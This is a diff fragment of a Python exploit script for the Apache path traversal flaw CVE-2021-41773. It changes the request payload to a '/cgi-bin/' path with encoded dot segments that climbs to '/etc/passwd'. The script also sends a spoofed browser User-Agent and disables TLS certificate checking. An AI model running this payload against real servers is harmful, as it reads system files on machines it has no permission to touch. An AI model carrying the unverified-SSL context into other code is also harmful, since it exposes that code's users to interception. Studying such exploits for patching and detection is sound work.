@@ -14,7 +14,7 @@ def CVE_2021_41773(url):
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
     }
 
-    payload = '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+    payload = '/cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd'
     # 防止ssl报错
     context = ssl._create_unverified_context()
     vurl = urllib.parse.urljoin(url, payload)
